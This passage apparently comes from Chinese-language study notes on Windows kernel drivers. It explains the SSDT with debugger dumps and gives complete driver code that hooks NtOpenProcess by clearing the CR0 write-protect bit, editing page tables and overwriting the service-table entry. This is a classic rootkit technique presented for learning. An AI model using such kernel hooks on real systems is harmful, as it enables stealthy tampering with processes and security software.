0</span><br><span class="line">#define METHOD_IN_DIRECT                1   //直接读取方式</span><br><span class="line">#define FILE_READ_DATA            ( 0x0001 )    // file &amp; pipe</span><br><span class="line">#define FILE_WRITE_DATA           ( 0x0002 )    // file &amp; pipe</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#define CTL_CODE(DeviceType,Function,Method,Access)</span><br><span class="line">DeviceType:设备对象类型   </span><br><span class="line">Function：驱动IOCTL码</span><br><span class="line">0x000到0x7FF为微软保留</span><br><span class="line">0x800到0xFFF程序员定义</span><br><span class="line">Method：操作模式METHOD_BUFFERED，METHOD_IN_DIRECT,METHOD_NEITHER</span><br><span class="line">Access:访问权限一般是FILE_ANY_ACCESS</span><br></pre></td></tr></table></figure><h4 id="函数所占属性"><a href="#函数所占属性" class="headerlink" title="函数所占属性"></a>函数所占属性</h4><p>可以用#pragma alloc_text(类型，函数名)<br>指定函数占用内存的类型，有以下几种：<br>INIT，调用玩可释放<br>PAGE，位于分页内存<br>NONE_PAGE，位于非分页内存   </p><h4 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h4><p>用一个宏检测是否成功 NT_SUCCESS</p><h4 id="IRQL"><a href="#IRQL" class="headerlink" title="IRQL"></a>IRQL</h4><p>保证内核安全，修改某个全局变量造成问题，提出中断请求级别概念（Interrupt ReQuest Level，IRQL）概念<br>DIspatch：所有运行在这个级别代码都是被进行原子操作，切不能访问分页内存，也就是说操作系统在一个世界只能运行一段Dispatch级的代码，且必须将其完全执行和才会发生线程切换<br>APC：比Dispatch低一个级别，可以访问分页内存<br>Passive：最低的优先级，大多数代码运行的级别   </p><h1 id="SSDT-HOOK"><a href="#SSDT-HOOK" class="headerlink" title="SSDT HOOK"></a>SSDT HOOK</h1><p>首先要明白SSDTHOOK就是自己再写一份函数，替换了SSDT表中的地址替换掉<br><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/qudong/1.png" alt="SystemServiceTable系统服务表"></p><h2 id="如何访问系统服务表呢？"><a href="#如何访问系统服务表呢？" class="headerlink" title="如何访问系统服务表呢？"></a>如何访问系统服务表呢？</h2><p>SSDT  的全称是 System Services Descriptor Table，系统服务描述符表</p><p>下面这个是个全局变量<br>kd&gt; dd  KeServiceDescriptorTable(SSDT)</p><p>这个导出的 声明一下就可以使用了</p><p>kd&gt; dd  KeServiceDescriptorTableShadow(SSDT Shadow)</p><p>这个未导出 需要用其他的方式来查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KeServiceDescriptorTable</span><br><span class="line">83fac9c0  83ec0d9c 00000000 00000191 83ec13e4</span><br><span class="line">83fac9d0  00000000 00000000 00000000 00000000</span><br><span class="line">83fac9e0  83f1f6af 00000000 025355a9 000000bb</span><br><span class="line">83fac9f0  00000011 00000100 5385d2ba d717548f</span><br><span class="line">83faca00  83ec0d9c 00000000 00000191 83ec13e4</span><br><span class="line">83faca10  956d6000 00000000 00000339 956d702c</span><br><span class="line">83faca20  00000000 00000000 83faca24 00000340</span><br><span class="line">83faca30  00000340 865fab00 00000007 00000000</span><br></pre></td></tr></table></figure><p>其中83ec0d9c是函数地址，00000191是函数个数，83ec13e4是函数参数个数，单位是一个字节，除以4就是函数地址表上对应函数的个数，第一个函数对第一个个数。</p><h2 id="下面就是函数地址表"><a href="#下面就是函数地址表" class="headerlink" title="下面就是函数地址表"></a>下面就是函数地址表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd 83ec0d9c</span><br><span class="line">83ec0d9c  840bcc28 83f0340d 8404cb68 83e6788a</span><br><span class="line">83ec0dac  840be4ff 83f403fa 8412eb05 8412eb4e</span><br><span class="line">83ec0dbc  840413bd 84148368 841495c1 84037b95</span><br><span class="line">83ec0dcc  840c8b35 84121963 84074a56 840446cc</span><br><span class="line">83ec0ddc  83fda928 84113898 8402b14e 8406da62</span><br><span class="line">83ec0dec  840b9df1 8401b238 840b91fe 84038c0c</span><br><span class="line">83ec0dfc  840ca5bc 8403b28f 840ca39c 840c2afc</span><br><span class="line">83ec0e0c  8404d0f0 8410e657 840bfec9 840ca7ee</span><br><span class="line"></span><br><span class="line">根据这个定义一个结构体</span><br><span class="line">//下面这个是系统服务表的结构体</span><br><span class="line">typedef struct _KSYSTEM_SERVICE_TABLE  </span><br><span class="line">&#123;  </span><br><span class="line">    PULONG  ServiceTableBase;                               // 服务函数地址表基址  </span><br><span class="line">    PULONG  ServiceCounterTableBase;                            </span><br><span class="line">    ULONG   NumberOfService;                                // 服务函数的个数  </span><br><span class="line">    PULONG   ParamTableBase;                                // 服务函数参数表基址   </span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE;</span><br></pre></td></tr></table></figure><h2 id="下面就是函数参数个数表除四就是真正个数"><a href="#下面就是函数参数个数表除四就是真正个数" class="headerlink" title="下面就是函数参数个数表除四就是真正个数"></a>下面就是函数参数个数表除四就是真正个数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">kd&gt; db 83ec13e4</span><br><span class="line">83ec13e4  18 20 2c 2c 40 2c 40 44-0c 08 08 18 18 08 04 04  . ,,@,@D........</span><br><span class="line">83ec13f4  0c 0c 10 18 24 0c 2c 0c-18 10 0c 0c 0c 0c 0c 0c  ....$.,.........</span><br><span class="line">83ec1404  08 0c 18 18 14 18 0c 20-10 08 08 08 0c 08 0c 0c  ....... ........</span><br><span class="line">83ec1414  08 04 04 0c 08 08 08 08-0c 04 04 20 08 10 0c 20  ........... ... </span><br><span class="line">83ec1424  14 0c 2c 10 0c 0c 1c 10-20 20 10 38 10 14 10 20  ..,.....  .8... </span><br><span class="line">83ec1434  24 24 28 1c 1c 14 10 20-2c 10 34 28 18 2c 14 28  $$(.... ,.4(.,.(</span><br><span class="line">83ec1444  08 0c 08 04 04 04 04 04-0c 04 08 28 00 04 04 1c  ...........(....</span><br><span class="line">83ec1454  18 00 08 08 18 0c 14 18-08 18 0c 08 08 0c 04 00  ................</span><br></pre></td></tr></table></figure><h2 id="如何得到函数表地址"><a href="#如何得到函数表地址" class="headerlink" title="如何得到函数表地址"></a>如何得到函数表地址</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//这个就是SSDT的结构体，即系统服务描述表，里面就是多个系统服务表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSERVICE_TABLE_DESCRIPTOR</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">    KSYSTEM_SERVICE_TABLE   ntoskrnl;                       <span class="comment">// ntoskrnl.exe 的服务函数  </span></span><br><span class="line">    KSYSTEM_SERVICE_TABLE   win32k;                         <span class="comment">// win32k.sys 的服务函数(GDI32.dll/User32.dll 的内核支持)  </span></span><br><span class="line">    KSYSTEM_SERVICE_TABLE   notUsed1;  </span><br><span class="line">    KSYSTEM_SERVICE_TABLE   notUsed2;  </span><br><span class="line">&#125;KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>//导出由 ntoskrnl（10-10-12）所导出的 SSDT<br>extern PKSERVICE_TABLE_DESCRIPTOR    KeServiceDescriptorTable;   </p><p>//这个是导出的，要到内核文件找，所以名字不能瞎起</p><p>下面的代码是查看到SSDT表地址的代码，可以打印显示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;ntddk.h&gt;</span><br><span class="line">#include&lt;ntstatus.h&gt;</span><br><span class="line"></span><br><span class="line">typedef struct _KSYSTEM_SERVICE_TABLE</span><br><span class="line">&#123;</span><br><span class="line">PULONG  ServiceTableBase;                               // 服务函数地址表基址  </span><br><span class="line">PULONG  ServiceCounterTableBase;</span><br><span class="line">ULONG   NumberOfService;                                // 服务函数的个数  </span><br><span class="line">PULONG   ParamTableBase;                                // 服务函数参数表基址   </span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE;</span><br><span class="line"></span><br><span class="line">typedef struct _KSERVICE_TABLE_DESCRIPTOR</span><br><span class="line">&#123;</span><br><span class="line">KSYSTEM_SERVICE_TABLE   ntoskrnl;                       // ntoskrnl.exe 的服务函数  </span><br><span class="line">KSYSTEM_SERVICE_TABLE   win32k;                         // win32k.sys 的服务函数(GDI32.dll/User32.dll 的内核支持)  </span><br><span class="line">KSYSTEM_SERVICE_TABLE   notUsed1;</span><br><span class="line">KSYSTEM_SERVICE_TABLE   notUsed2;</span><br><span class="line">&#125;KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//导出由 ntoskrnl所导出的 SSDT</span><br><span class="line">extern PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;//这个是导出的，要到内核文件找，所以名字不能瞎起</span><br><span class="line"></span><br><span class="line">VOID DriverUnload(PDRIVER_OBJECT pDriver) &#123;</span><br><span class="line">UNREFERENCED_PARAMETER(pDriver);</span><br><span class="line">KdPrint((&quot;My Dirver is unloading...&quot;));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pPath) &#123;</span><br><span class="line">UNREFERENCED_PARAMETER(pPath);</span><br><span class="line">KdPrint((&quot;-&gt;%x \n&quot;, KeServiceDescriptorTable));</span><br><span class="line">pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">return STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="通过页表基址修改页属性"><a href="#通过页表基址修改页属性" class="headerlink" title="通过页表基址修改页属性"></a>通过页表基址修改页属性</h2><p>SSDT所在的物理页是只读的，如果要修改，先要修改页属性为可写：</p><p>1、第一种办法，用我们学过的知识，通过页表基址直接修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">if(RCR4 &amp; 0x00000020)</span><br><span class="line">&#123;//说明是2-9-9-12分页</span><br><span class="line">KdPrint((&quot;2-9-9-12分页 %p\n&quot;,RCR4));</span><br><span class="line">KdPrint((&quot;PTE1 %p\n&quot;,*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 9) &amp; 0x007FFFF8))));</span><br><span class="line">*(DWORD64*)(0xC0000000 + ((HookFunAddr &gt;&gt; 9) &amp; 0x007FFFF8)) |= 0x02; </span><br><span class="line">KdPrint((&quot;PTE1 %p\n&quot;,*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 9) &amp; 0x007FFFF8))));</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;//说明是10-10-12分页</span><br><span class="line">KdPrint((&quot;10-10-12分页\n&quot;));</span><br><span class="line">KdPrint((&quot;PTE1 %p\n&quot;,*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 10) &amp; 0x003FFFFC))));</span><br><span class="line">*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 10) &amp; 0x003FFFFC)) |= 0x02;</span><br><span class="line">KdPrint((&quot;PTE2 %p\n&quot;,*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 10) &amp; 0x003FFFFC))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="通过修改CR0寄存器（WP位置改成0）"><a href="#通过修改CR0寄存器（WP位置改成0）" class="headerlink" title="通过修改CR0寄存器（WP位置改成0）"></a>通过修改CR0寄存器（WP位置改成0）</h2><p><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/qudong/2.png" alt="CR0寄存器">  </p><p>比如我们要SSDTHOOKNtOpenProcess，就要先通过IDA找到kernelBase的OpenProcess，在经过一系列查看最后在ntdll里找到ZWOpenProcess，所在位置看到了NtOpenProcess</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:77F05D88                 mov     eax, 0BEh       ; NtOpenProcess</span><br><span class="line">.text:77F05D8D                 mov     edx, 7FFE0300h</span><br><span class="line">.text:77F05D92                 call    dword ptr [edx]</span><br><span class="line">.text:77F05D94                 retn    10h</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KeServiceDescriptorTable</span><br><span class="line">83f789c0  83e8cd9c 00000000 00000191 83e8d3e4</span><br><span class="line">83f789d0  00000000 00000000 00000000 00000000</span><br><span class="line">83f789e0  83eeb6af 00000000 025355a9 000000bb</span><br><span class="line">83f789f0  00000011 00000100 5385d2ba d717548f</span><br><span class="line">83f78a00  83e8cd9c 00000000 00000191 83e8d3e4</span><br><span class="line">83f78a10  95d46000 00000000 00000339 95d4702c</span><br><span class="line">83f78a20  00000000 00000000 83f78a24 00000340</span><br><span class="line">83f78a30  00000340 865fab00 00000007 00000000</span><br><span class="line">kd&gt; dd 83e8cd9c+4*BE</span><br><span class="line">83e8d094  840219dc 84073fff 84061b37 83f8d0c7</span><br><span class="line">83e8d0a4  84079674 83ff50c6 84096977 8405db6f</span><br><span class="line">83e8d0b4  8406dd87 840882e4 84061c4e 84119e0f</span><br><span class="line">83e8d0c4  841026f1 84103989 83ff3506 84050970</span><br><span class="line">83e8d0d4  841022a2 84101fc2 8410235a 8410207a</span><br><span class="line">83e8d0e4  8400693f 83fd5f60 83ff0a51 841040e4</span><br><span class="line">83e8d0f4  841041aa 84052403 840a35a7 840679a1</span><br><span class="line">83e8d104  84114a3e 84114e83 83ed2d34 84086b8c</span><br><span class="line">kd&gt; u 840219dc </span><br><span class="line">nt!NtOpenProcess:</span><br><span class="line">840219dc 8bff            mov     edi,edi</span><br><span class="line">840219de 55              push    ebp</span><br><span class="line">840219df 8bec            mov     ebp,esp</span><br><span class="line">840219e1 51              push    ecx</span><br><span class="line">840219e2 51              push    ecx</span><br><span class="line">840219e3 64a124010000    mov     eax,dword ptr fs:[00000124h]</span><br><span class="line">840219e9 8a803a010000    mov     al,byte ptr [eax+13Ah]</span><br><span class="line">840219ef 8b4d14          mov     ecx,dword ptr [ebp+14h]</span><br></pre></td></tr></table></figure><p>下面说一下通过MDL修改页属性。<br>就是 Memory Descriptor List，简称 MDL。有的同学可能会问了，MDL究竟是个什么东西呢？从字面意思看，不难理解，内存描述符列表。MDL包含了内存区域的起始、拥有者proc、字节数、标记等。OK，我们需要先定义一个MDL的指针。   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PMDL MDLSystemCall;</span><br></pre></td></tr></table></figure><p>定义了MDL的指针以后，我们要通过MAPPED系列的参数来使内存拥有可写性，然后锁定内存中的MDL，那么我们就要定义一个PVOID的指针，来供MmMap操作。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVOID *MappedSCT;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MDLSystemCall = MmCreateMdl(</span><br><span class="line">NULL, //内存描述符列表</span><br><span class="line">KeServiceDescriptorTable.ServiceTableBase,//</span><br><span class="line">内存地址</span><br><span class="line">KeServiceDescriptorTable.NumberOfServices*4);//内存长度</span><br><span class="line">if(!MDLSystemCall)</span><br><span class="line">  return STATUS_UNSUCCESSFUL;</span><br></pre></td></tr></table></figure><p>建立了MDL，填充一下页数组   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MmBuildMdlForNonPagedPool(MDLSystemCall);//建立内存页的MDL描述   </span><br><span class="line">MDLSystemCall-&gt;MdlFlags = MDLSystemCall-&gt;MdlFlags | MDL_MAPPED_TO_SYSTEM_VA; //设置MDL标记为可写</span><br><span class="line">MappedSCT = MmMapLockedPages(MDLSystemCall, KernelMode);</span><br></pre></td></tr></table></figure><p>然后做自己的操作，比如这里的Hook</p><p>然后另外还有释放MDL的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(MDSystemCall)</span><br><span class="line">   &#123;</span><br><span class="line">      MmUnmapLockedPages(MappedSCT, MDSystemCall);</span><br><span class="line">      IoFreeMdl(MDSystemCall);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>下面是SSDT-Hook代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;ntddk.h&gt;</span><br><span class="line">#include&lt;ntstatus.h&gt;</span><br><span class="line">//1.找到系统服务表的函数地址表</span><br><span class="line">//定义一个全局变量用来存放之前的NtOpenProcess地址</span><br><span class="line">ULONG uOldNtOpenProcess;</span><br><span class="line">//有了地址还需要一个函数NtOpenProcess指针，用于调用原来的NtOpenProcess</span><br><span class="line"></span><br><span class="line">//定义修复和恢复页属性的函数</span><br><span class="line">PMDL MDSystemCall;</span><br><span class="line">PVOID *MappedSCT;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">typedef NTSTATUS(*NTOPENPROCESS)(</span><br><span class="line">__out PHANDLE  ProcessHandle,</span><br><span class="line">__in ACCESS_MASK  DesiredAccess,</span><br><span class="line">__in POBJECT_ATTRIBUTES  ObjectAttributes,</span><br><span class="line">__in_opt PCLIENT_ID  ClientId</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">typedef struct _KSYSTEM_SERVICE_TABLE</span><br><span class="line">&#123;</span><br><span class="line">PULONG  ServiceTableBase;                               // 服务函数地址表基址  </span><br><span class="line">PULONG  ServiceCounterTableBase;</span><br><span class="line">ULONG   NumberOfService;                                // 服务函数的个数  </span><br><span class="line">PULONG   ParamTableBase;                                // 服务函数参数表基址   </span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE;</span><br><span class="line"></span><br><span class="line">typedef struct _KSERVICE_TABLE_DESCRIPTOR</span><br><span class="line">&#123;</span><br><span class="line">KSYSTEM_SERVICE_TABLE   ntoskrnl;                       // ntoskrnl.exe 的服务函数  </span><br><span class="line">KSYSTEM_SERVICE_TABLE   win32k;                         // win32k.sys 的服务函数(GDI32.dll/User32.dll 的内核支持)  </span><br><span class="line">KSYSTEM_SERVICE_TABLE   notUsed1;</span><br><span class="line">KSYSTEM_SERVICE_TABLE   notUsed2;</span><br><span class="line">&#125;KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//导出由 ntoskrnl所导出的 SSDT</span><br><span class="line">extern PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;//这个是导出的，要到内核文件找，所以名字不能瞎起</span><br><span class="line"></span><br><span class="line">//准备用于替换的函数</span><br><span class="line">NTSTATUS NTAPI MyNtOpenProcess(__out PHANDLE  ProcessHandle,</span><br><span class="line">__in ACCESS_MASK  DesiredAccess,</span><br><span class="line">__in POBJECT_ATTRIBUTES  ObjectAttributes,</span><br><span class="line">__in_opt PCLIENT_ID  ClientId</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">NTSTATUS Status;</span><br><span class="line">Status = STATUS_SUCCESS;</span><br><span class="line">//这里填自己的业务。。。各种过滤，修改返回结构等</span><br><span class="line">KdPrint((&quot;MyNtOpenProcess %x %x %x %x \n&quot;, ProcessHandle, DesiredAccess, ObjectAttributes, ClientId));</span><br><span class="line">//后面这里填的是打开原来的函数，因为这个函数也要实现原来的功能，不然就乱套了，除非你自己在自己业务里实现了</span><br><span class="line">return ((NTOPENPROCESS)uOldNtOpenProcess)(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void PageProtectOff() &#123;</span><br><span class="line"></span><br><span class="line">//MDSystemCall = MmCreateMdl(NULL, KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase, KeServiceDescriptorTable-&gt;ntoskrnl.NumberOfService * 4);</span><br><span class="line">//if (!MDSystemCall)</span><br><span class="line">////return STATUS_UNSUCCESSFUL;</span><br><span class="line">//return;</span><br><span class="line">//MmBuildMdlForNonPagedPool(MDSystemCall);</span><br><span class="line">//MDSystemCall-&gt;MdlFlags = MDSystemCall-&gt;MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;</span><br><span class="line">//MappedSCT = MmMapLockedPages(MDSystemCall, KernelMode);</span><br><span class="line">__asm &#123; //关闭内存保护</span><br><span class="line">push eax;</span><br><span class="line">mov eax, cr0;</span><br><span class="line">and eax, ~0x10000;</span><br><span class="line">mov cr0, eax;</span><br><span class="line">pop eax;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void PageProtectOn() &#123;</span><br><span class="line">////解锁、释放MDL</span><br><span class="line">//if (MDSystemCall)</span><br><span class="line">//&#123;</span><br><span class="line">//MmUnmapLockedPages(MappedSCT, MDSystemCall);</span><br><span class="line">//IoFreeMdl(MDSystemCall);</span><br><span class="line">//&#125;</span><br><span class="line">__asm &#123; //恢复内存保护</span><br><span class="line">push eax;</span><br><span class="line">mov eax, cr0;</span><br><span class="line">or eax, 0x10000;</span><br><span class="line">mov cr0, eax;</span><br><span class="line">pop eax;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">//3.修改函数地址,准备个函数用来修改函数地址</span><br><span class="line">void HookNtOpenProcess() &#123;</span><br><span class="line">NTSTATUS Status;</span><br><span class="line">Status = STATUS_SUCCESS;</span><br><span class="line">PageProtectOff();</span><br><span class="line">uOldNtOpenProcess = KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[0xBE];</span><br><span class="line">KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[0xBE] = (ULONG)MyNtOpenProcess;</span><br><span class="line">PageProtectOn();</span><br><span class="line">&#125;</span><br><span class="line">//4.恢复</span><br><span class="line">void UnHookNtOpenProcess() &#123;</span><br><span class="line">PageProtectOff();</span><br><span class="line">KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[0xBE] = (ULONG)uOldNtOpenProcess;</span><br><span class="line">PageProtectOn();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID DriverUnload(PDRIVER_OBJECT pDriver) &#123;</span><br><span class="line">UNREFERENCED_PARAMETER(pDriver);</span><br><span class="line">UnHookNtOpenProcess();</span><br><span class="line"></span><br><span class="line">KdPrint((&quot;My Dirver is unloading...&quot;));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pPath) &#123;</span><br><span class="line">UNREFERENCED_PARAMETER(pPath);</span><br><span class="line">KdPrint((&quot;-&gt;%x \n&quot;, KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[0xBE]));//得到函数地址表</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HookNtOpenProcess();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">return STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 